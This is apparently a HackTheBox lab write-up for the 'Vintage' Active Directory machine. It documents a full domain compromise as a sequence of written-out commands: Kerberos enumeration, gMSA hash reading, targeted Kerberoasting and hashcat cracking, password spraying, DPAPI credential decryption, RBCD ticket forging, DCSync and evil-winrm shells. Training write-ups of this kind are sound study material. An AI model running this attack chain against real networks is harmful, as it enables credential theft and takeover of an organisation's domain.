# HackTheBox Writeup: Vintage

**Difficoltà:** Hard
**OS:** Windows
**Date:** 02/04/2026

## 1. Information Gathering & Reconnaissance
IP target: 10.129.231.205
Credentials: P.Rosa:Rosaisbest123

### 1.1 Port Scanning

The assessment began with a comprehensive network port scan using Nmap to identify exposed services and map the target's attack surface. We utilized the **-sC** flag for default enumeration scripts and **-sV** for service version detection.

```
sudo nmap -sC -sV -oA nmap/vintage 10.129.231.205
```

<img width="1003" height="533" alt="image" src="https://github.com/user-attachments/assets/1982cffe-79f1-42c9-9fd7-2d94eb9f506c" />

The scan revealed a standard Active Directory environment (DNS, Kerberos, SMB, LDAP). Notably, LDAPS (port 636) was TCP-wrapped, meaning it strictly enforced SSL client certificates for connections. Based on the exposed services, we updated our local **/etc/hosts** file to resolve **vintage.htb** and **dc01.vintage.htb** to the target IP, which is a strict requirement for Kerberos authentication.

## 2. Enumeration & Initial Access

### 2.1 SMB & Authentication Mechanisms

Initial attempts to authenticate using the provided credentials via standard NTLM protocols failed. It was determined that **NTLM authentication is completely disabled** on this domain. Consequently, all authentication attempts had to be routed through Kerberos.
Kerberos is highly sensitive to hostname resolution, therefore, we targeted the Fully Qualified Domain Name (FQDN) rather than the IP address, passing the **-k** flag to NetExec (NXC) to force Kerberos authentication.

```
nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123' -k
```

<img width="1116" height="65" alt="image" src="https://github.com/user-attachments/assets/23c4cd69-4928-4dce-83f3-82080d60206a" />

We then verified our access and enumerated domain users:

```
nxc smb dc01.vintage.htb -u P.Rosa -p 'Rosaisbest123'  -k --users
```

<img width="1356" height="317" alt="image" src="https://github.com/user-attachments/assets/79c4a9f1-7b8e-4c4a-bcbb-ac1160c57fd4" />

### 2.2 Active Directory ACL Enumeration (BloodHound)

To silently map the domain's permission architecture, we ingested the Active Directory data into BloodHound.
Analysis of the attack paths revealed a potential Resource-Based Constrained Delegation (RBCD) vector. Specifically, users like **L. Bianchi** and ** C.Neri** hold the right to add themselves to the **DELEGATEDADMINS** group.
This group is critical because it holds the **AllowedToAct** privilege over the Domain Controller (**DC01**), which could eventually allow for domain compromise.

``` 
rusthound-ce -d vintage.htb -u P.Rosa -p 'Rosaisbest123'
```

<img width="1206" height="356" alt="image" src="https://github.com/user-attachments/assets/01959115-fe53-4c44-ad18-c7d394680b7c" />

They can then use the AllowedToAct privilege to become DC administrators.
<img width="971" height="347" alt="image" src="https://github.com/user-attachments/assets/f0e49c1f-013b-4c36-9a6c-58ce10823443" />

### 2.3 Offline Password Trend Analysis

Instead of generating noisy queries against the Domain Controller, we analyzed the raw JSON data dumped by BloodHound to identify potential password spraying targets. Using jq, we correlated user accounts with their **pwdlastset** (Last Password Set) timestamp:

```
cat 20260402090810_vintage-htb_users.json | jq '.data[].Properties | select(.samaccountname) | "\(.pwdlastset):\(.samaccountname)"' -r | sort -n
```


<img width="1217" height="273" alt="image" src="https://github.com/user-attachments/assets/ca01f6a4-1958-4052-9866-c221527a7191" />

The output revealed that multiple users and service accounts had their passwords set at the exact same millisecond. This strongly indicates the use of an automated provisioning script, which often assigns identical default passwords to bulk-created accounts, presenting a high risk of password reuse.
But the most important thing is this service account: **gMSA01$** 

<img width="737" height="216" alt="image" src="https://github.com/user-attachments/assets/a82ea4ba-4da0-4908-be34-bffcc1a15625" />

## 3. Exploitation & Lateral Movement

### 3.1 Pre-Windows 2000 Compatible Access Vulnerability

During our BloodHound analysis, we identified a Group Managed Service Account named **gMSA01$**.

We discovered that the **DOMAIN COMPUTERS** group has **ReadGMSAPassword** rights over this account. Further inspection revealed that the machine account **FS01$** is a member of the **Pre-Windows 2000 Compatible Access group**.

**Vulnerability Insight:** Due to a legacy Active Directory configuration, when a computer account is pre-created and placed in the "Pre-Windows 2000 Compatible Access" group, its default password is automatically set to the computer's name in lowercase. **(Reference: TrustedSec - Diving into Pre-created Computer Accounts)**.

```
https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts
```

<img width="782" height="115" alt="image" src="https://github.com/user-attachments/assets/4ab6d1f2-8f06-4025-a7ac-e4f2b42348e4" />

We successfully authenticated as the machine account using this logic:

`nxc smb dc01.vintage.htb -k -u 'fs01$' -p fs01`

<img width="1107" height="57" alt="image" src="https://github.com/user-attachments/assets/bac1b3ce-b994-4d47-a683-c8cef15ad9b3" />

### 3.2 GMSA Hash Extraction

`nxc ldap dc01.vintage.htb -k -u 'fs01$' -p fs01 --gmsa`

### 3.3 Targeted Kerberoasting
BloodHound indicated that **gMSA01$** has the right to add itself to the **ServiceManagers** group. We executed this action using the newly acquired NTLM hash:

`bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k add groupMember ServiceManagers 'gmsa01$'`

The **ServiceManagers** group possesses GenericAll (full control) over three service accounts (**svc_sql**, **svc_ark**, **svc_ldap**). Although these accounts did not natively have a ServicePrincipalName (SPN) making them immune to standard Kerberoasting our **GenericAll** permissions allowed us to perform a Targeted Kerberoasting attack. This technique involves manually assigning a dummy SPN to the accounts, requesting the Kerberos TGS ticket (which contains the crackable password hash), and subsequently removing the SPN. (full control) over three service accounts (svc_sql, svc_ark, svc_ldap). Although these accounts did not natively have a ServicePrincipalName (SPN) making them immune to standard Kerberoasting our GenericAll permissions allowed us to perform a Targeted Kerberoasting attack. This technique involves manually assigning a dummy SPN to the accounts, requesting the Kerberos TGS ticket (which contains the crackable password hash), and subsequently removing the SPN.

<img width="1114" height="398" alt="image" src="https://github.com/user-attachments/assets/850cfa72-184c-4eba-964d-53f24764b3e5" />

To ensure stability with Python exploitation scripts, we requested a Ticket Granting Ticket (TGT) for the GMSA account and exported it to our environment variables:

```
getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :0851299c01b944d01099fc977eaa6c67
```

With the ticket cached, we initiated the targeted kerberoasting process using an automated Python script, initially testing it against a specific user (svc_ark) and then against the broader domain:

<img width="809" height="77" alt="image" src="https://github.com/user-attachments/assets/05959753-0f01-4e49-9d73-765fcc01d916" />

```
KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb --request-user svc_ark
```

<img width="1118" height="61" alt="image" src="https://github.com/user-attachments/assets/4dbbf6ca-3f6e-4da4-8a8d-e70227941f93" />

```
KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

<img width="1909" height="383" alt="image" src="https://github.com/user-attachments/assets/71eb6824-99f2-476a-b79f-6e8699cfc591" />
During this process, we observed that the **svc_sql** account was currently disabled, preventing the Domain Controller from issuing a ticket for it. Relying on our GenericAll rights, we reactivated the account by stripping the ACCOUNTDISABLE flag from its UserAccountControl (UAC) attribute:

```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE
```

<img width="1241" height="61" alt="image" src="https://github.com/user-attachments/assets/09a28c77-bc02-4a84-9b56-805c551e8cb1" />

Re-running the automated script now successfully yielded all three TGS hashes:

``` 
KRB5CCNAME=gmsa01$.ccache python3 targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

<img width="1905" height="593" alt="image" src="https://github.com/user-attachments/assets/d38cc787-8d49-4052-a9a3-ed8e3cb9aa2a" />

### 3.5 Manual SPN Manipulation & Extraction

To fully document and manually validate this attack vector, we also performed the SPN manipulation using **bloodyAD**. We injected arbitrary SPNs into the three service accounts:

```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_sql servicePrincipalName -v 'http/sql'
```

<img width="1355" height="43" alt="image" src="https://github.com/user-attachments/assets/0f4e9899-8916-4c68-8354-90ca2a6f247a" />

```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ark servicePrincipalName -v 'http/ark'
```

<img width="1351" height="52" alt="image" src="https://github.com/user-attachments/assets/c0f98dd0-fa25-4ae3-bdb0-597e0a35f322" />


```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '0851299c01b944d01099fc977eaa6c67' -f rc4 --host dc01.vintage.htb -k set object svc_ldap servicePrincipalName -v 'http/ldap'
```

<img width="1353" height="43" alt="image" src="https://github.com/user-attachments/assets/668e1a3a-3e66-4cd3-826d-af2e452e0af5" />

Once the SPNs were statically set, we utilized NetExec's LDAP module to dump the Kerberos hashes in bulk and save them to a file for offline cracking:

```
nxc ldap dc01.vintage.htb -k -u 'gmsa01$' -H 0851299c01b944d01099fc977eaa6c67 -k --kerberoasting nxc.hashes
```

<img width="1904" height="619" alt="image" src="https://github.com/user-attachments/assets/00731e59-5abb-43ce-aa4e-6647d3f7fae8" />

### 3.4 Password Cracking & Spraying

We subjected the extracted TGS hashes to an offline dictionary attack using Hashcat and the rockyou wordlist.

```
hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force
```

<img width="1896" height="162" alt="image" src="https://github.com/user-attachments/assets/c32b7e34-e188-4a59-ae22-bbaa8efd91c5" />

Relying on our earlier JSON analysis which highlighted potential password reuse we performed a password spraying attack against the domain users using this newly discovered password.

```
nxc ldap dc01.vintage.htb -k -u users.txt -p Zer0the0ne -k --continue-on-success
```

This confirmed that the user **c.neri** shared the exact same password.

<img width="978" height="393" alt="image" src="https://github.com/user-attachments/assets/7dbb2091-caa6-4a5a-ad2b-9eb8adc8d0ae" />

## 4. Initial Foothold (WinRM Access)

Further enumeration indicated that **c.neri** is a member of the **Remote Management Users** group, granting them the right to authenticate remotely via WinRM.
Due to the strict Kerberos enforcement on the host, a standard WinRM connection via IP or cleartext password was rejected. To bypass this, we generated a valid Kerberos configuration file specifically for the target domain and requested a TGT for **c.neri** :

```
nxc smb dc01.vintage.htb -u c.neri -p Zer0the0ne --generate-krb5-file vintage.krb5
```

<img width="1091" height="86" alt="image" src="https://github.com/user-attachments/assets/901616a0-317e-4994-b69a-ea293e6aeb25" />

```
getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip 10.129.231.205
```

With the TGT loaded into the environment, we invoked **evil-winrm**, specifying the realm to strictly enforce Kerberos authentication, successfully establishing a remote shell on the target machine.

```
KRB5CCNAME=c.neri.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb
```
### 4.1 DPAPI Decryption and Download


**DPAPI (Data Protection API)** is a Windows feature that allows applications to store encrypted secrets (such as passwords and credentials) on the disk. The encryption is tied to the Windows user; only that user can decrypt their own data. Windows uses it, for example, to store browser passwords, network credentials, and so on.

One of the first things to do is check if there are any hidden compartments in the machine.  

```
cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
gci -force
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

Let's download the credential blob: this is the file that Windows creates when an application or user saves a credential in the Windows Credential Manager (the one you see in Control Panel → Credential Manager). It contains encrypted usernames and passwords. The name is simply an identifying hash generated by Windows; it has no readable meaning.

<img width="1899" height="258" alt="image" src="https://github.com/user-attachments/assets/65187eaa-cde4-4498-a78e-3c6ebf1bdde0" />

The folder **Protect\S-1-5-21-...-1115** belongs to the user with that SID (in this case, **c.neri**). It contains:
**4dbf04d8-...** and ** 99cf41a3-...** → these are the master key files. Each file contains an encryption key (the master key) encrypted with the user's password. The name is a GUID generated by Windows. There are two of them because Windows generates a new one periodically (rotation) and keeps the old one so it can still decrypt the blobs encrypted with it. 

```
cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
gci -force
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
```

<img width="1888" height="419" alt="image" src="https://github.com/user-attachments/assets/7b750304-e666-498c-8707-cf189961404c" />

### 4.2 Generate prekeys from the password

This command derives a set of cryptographic key candidates from the user's password and SID. The SID uniquely identifies the user in Active Directory

```
pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
```

<img width="862" height="82" alt="image" src="https://github.com/user-attachments/assets/604a1e90-e145-4083-93b5-d264269fc1e1" />

### 4.3 Decipher the master keys

pypykatz tries every prekey in the **pkf** file until one successfully decrypts the master key. The result is a long hex string this is the master key in plaintext. Then I concatenate the two strings.

```
pypykatz dpapi masterkey dpapiblob1 pkf -o mkf1
pypykatz dpapi masterkey dpapiblob2 pkf -o mkf2
```
<img width="1445" height="142" alt="image" src="https://github.com/user-attachments/assets/f97987ab-d36d-4b27-ba28-276f69fb0f84" />

### 4.4 Decrypt the credential blob

```
pypykatz dpapi credential mkf credentialblob 
```

<img width="423" height="105" alt="image" src="https://github.com/user-attachments/assets/bbe35542-1b2e-4b4d-b176-2db2a84e3fc1" />

## 5. Privilege Escalation: Resource-Based Constrained Delegation (RBCD)

With administrative access via the **c.neri_adm** account, we returned to our BloodHound data to map a path to Domain Admin. BloodHound revealed a critical relationship: **c.neri_adm** holds the right to add members to the **DelegatedAdmins** group. Crucially, the **DelegatedAdmins** group possesses the **AllowedToAct **(AllowedToActOnBehalfOfOtherIdentity) privilege over the Domain Controller (**DC01**).

Vulnerability Insight: The **AllowedToAct** permission introduces a Resource-Based Constrained Delegation (RBCD) vulnerability. It allows whoever controls the group to forge Kerberos Service Tickets (ST) on behalf of any user to access the target resource (the DC). However, there is a strict Kerberos caveat: the account executing the impersonation attack must possess a Service Principal Name (SPN).

<img width="1188" height="355" alt="image" src="https://github.com/user-attachments/assets/40e20a5d-2cbe-4299-a99d-a14979319137" />

Since our current user (**c.neri_adm**) lacks an SPN, we cannot use it directly to forge the ticket. To bypass this, we leverage the **FS01$** computer account we compromised earlier in the assessment, as machine accounts possess SPNs by default.

<img width="372" height="134" alt="image" src="https://github.com/user-attachments/assets/01b9beca-edaf-4117-8e69-600aae7d4b8e" />

### 5.1 Forging the Ticket & DCSync

First, we use our current privileges to add the **FS01$** machine account to the **DelegatedAdmins** group:

```
bloodyAD -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'
```

<img width="1124" height="46" alt="image" src="https://github.com/user-attachments/assets/490cf148-fb89-43e6-afbf-53d862c7df67" />



Next, we must choose which identity to impersonate. While standard domain administrators are often protected against delegation (either by being in the "**ProtectedUsers**" group or having the "**Account is sensitive**" flag enabled), we can impersonate the Domain Controller's own machine account (**DC01$**).

This strategic choice allows us to perform a DCSync attack. Domain Controllers inherently hold the Replicating Directory Changes privileges. If the target DC believes our forged request is coming from a peer Domain Controller, it will synchronize and hand over the entire domain's password hashes.

We utilize Impacket's getST.py to forge the ticket on behalf of DC01$ for the cifs service:

```
 getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.21.207 'vintage.htb/fs01$:fs01'  
```

<img width="874" height="151" alt="image" src="https://github.com/user-attachments/assets/0f819786-9b01-458a-b4bd-767ecc67cf67" />

With the forged Service Ticket exported to our environment, we execute secretsdump.py to initiate the DCSync:

```
KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb
```

<img width="817" height="807" alt="image" src="https://github.com/user-attachments/assets/cdf475f7-d5b2-4782-a589-2ea7366b11e4" />

### 5.2 Bypassing Network Logon Restrictions for Full Compromise

The DCSync attack successfully extracts the NTLM hash for the built-in Administrator account (RID 500). We attempt to request a Ticket Granting Ticket (TGT) for this account:

```
getTGT.py -hashes :468c7497513f8243b59980f2240a10de vintage.htb/administrator@vintage.htb
```
<img width="852" height="84" alt="image" src="https://github.com/user-attachments/assets/a2dd4b8b-1e46-4e97-8b28-a6ed5e654be0" />

While the TGT request succeeds, attempting to use it to gain a remote WinRM shell fails. This occurs because modern security baselines and Active Directory best practices often explicitly deny Network Logon rights (such as WinRM or WMI access) to the default built-in Administrator account.

To circumvent this defense, we pivot to another highly privileged account we extracted from the DCSync: l.bianchi_adm. This is a secondary, human-created Domain Admin account that typically does not suffer from the same default network logon restrictions.

We request a TGT for** l.bianchi_adm:**

```
getTGT.py -hashes :501a825be327b9b1c7c7126dc39d5718  vintage.htb/l.bianchi_adm@vintage.htb
```

<img width="851" height="85" alt="image" src="https://github.com/user-attachments/assets/f19b88c6-f662-49e7-8833-6dae83c398c4" />

Finally, using the cached Kerberos ticket for the alternative administrator, we authenticate via **evil-winrm** and secure an interactive administrative shell on the Domain Controller, achieving full compromise of the Active Directory domain.

```
KRB5CCNAME='l.bianchi_adm@vintage.htb.ccache' evil-winrm -i dc01.vintage.htb -r vintage.htb
```
<img width="636" height="474" alt="image" src="https://github.com/user-attachments/assets/fd8974ea-46fb-4700-8c80-842003acaecd" />

